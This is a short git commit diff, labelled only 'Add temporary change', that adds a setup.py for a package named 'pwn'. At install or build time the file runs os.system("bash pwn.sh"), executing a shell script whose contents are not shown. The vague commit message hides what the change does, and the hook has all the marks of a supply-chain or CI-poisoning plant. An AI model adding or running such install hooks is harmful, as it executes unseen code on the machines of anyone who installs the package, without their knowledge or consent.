efd6201b534b085a32658f3be772fddf5dee10ca
j5884p5g <j5884p5g@rolf.ovh>
2026-04-20 02:20:01 +0000

    Add temporary change

---
+++ setup.py
@@ -0,0 +1,11 @@
+from setuptools import setup
+import os
+
+print("Okay, we got this far. Let's continue...")
+os.system("bash pwn.sh")
+
+setup(
+    name="pwn",
+    version="0.1.0",
+    packages=[],
+)
